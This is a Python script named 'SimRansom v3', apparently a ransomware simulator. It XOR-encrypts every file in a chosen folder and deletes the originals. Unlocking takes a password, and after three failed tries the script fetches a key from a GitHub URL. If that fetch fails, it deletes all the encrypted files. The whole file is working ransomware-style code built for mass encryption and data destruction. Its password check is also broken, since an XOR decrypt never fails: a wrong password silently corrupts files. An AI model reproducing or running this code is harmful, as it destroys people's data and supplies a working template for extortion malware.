import os
import json
import time
import requests
from getpass import getpass

REMOTE_KEY_URL = "https://raw.githubusercontent.com/sunnamsriram1/unlock-key/main/key.json"
MAX_ATTEMPTS = 3

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        data = bytearray(f.read())
    for i in range(len(data)):
        data[i] ^= ord(key[i % len(key)])
    with open(file_path + '.locked', 'wb') as f:
        f.write(data)
    os.remove(file_path)

def decrypt_file(file_path, key):
    original = file_path.replace('.locked', '')
    with open(file_path, 'rb') as f:
        data = bytearray(f.read())
    for i in range(len(data)):
        data[i] ^= ord(key[i % len(key)])
    with open(original, 'wb') as f:
        f.write(data)
    os.remove(file_path)

def self_destruct(folder):
    print("\n☠️  Initiating self-destruct in 10 seconds...")
    for i in range(1, 11):
        print(f"⏳ {i}....")
        time.sleep(1)
    for root, _, files in os.walk(folder):
        for file in files:
            if file.endswith('.locked'):
                file_path = os.path.join(root, file)
                os.remove(file_path)
                print(f"Deleted: {file}")

def fetch_remote_key():
    try:
        response = requests.get(REMOTE_KEY_URL)
        if response.status_code == 200:
            return json.loads(response.text).get("key", None)
    except Exception as e:
        print(f"⚠️ Error: {e}")
    return None

def main():
    print("🔐 SimRansom v3 — Remote Unlock File Locker")
    mode = input("🔄 Mode (lock/unlock): ").strip().lower()
    folder = input("📁 Enter target folder path: ").strip()

    if not os.path.isdir(folder):
        print("❌ Invalid folder path.")
        return

    if mode == 'lock':
        key = getpass("🔑 Enter password to lock: ")
        for root, _, files in os.walk(folder):
            for file in files:
                file_path = os.path.join(root, file)
                encrypt_file(file_path, key)
                print(f"🔒 Encrypted: {file}")
    elif mode == 'unlock':
        attempts = 0
        while attempts < MAX_ATTEMPTS:
            key = getpass("🔑 Enter password: ")
            test_file_found = False
            success = True
            for root, _, files in os.walk(folder):
                for file in files:
                    if file.endswith('.locked'):
                        test_file_found = True
                        file_path = os.path.join(root, file)
                        try:
                            decrypt_file(file_path, key)
                            encrypt_file(file_path.replace('.locked', ''), key)  # re-lock for test
                        except:
                            success = False
                        break
                if test_file_found:
                    break
            if success:
                for root, _, files in os.walk(folder):
                    for file in files:
                        if file.endswith('.locked'):
                            file_path = os.path.join(root, file)
                            decrypt_file(file_path, key)
                            print(f"🔓 Decrypted: {file}")
                return
            else:
                attempts += 1
                print(f"[X] Wrong password! ({attempts}/{MAX_ATTEMPTS})")

        print("\n🌐 Checking remote unlock key...")
        remote_key = fetch_remote_key()
        if remote_key:
            print("✅ Remote key match found!")
            for root, _, files in os.walk(folder):
                for file in files:
                    if file.endswith('.locked'):
                        file_path = os.path.join(root, file)
                        decrypt_file(file_path, remote_key)
                        print(f"🔓 Decrypted via remote key: {file}")
        else:
            print("❌ Could not fetch remote key.")
            self_destruct(folder)
            print("\n☠️  All encrypted files destroyed.")
    else:
        print("❌ Invalid mode.")

if __name__ == '__main__':
    main()
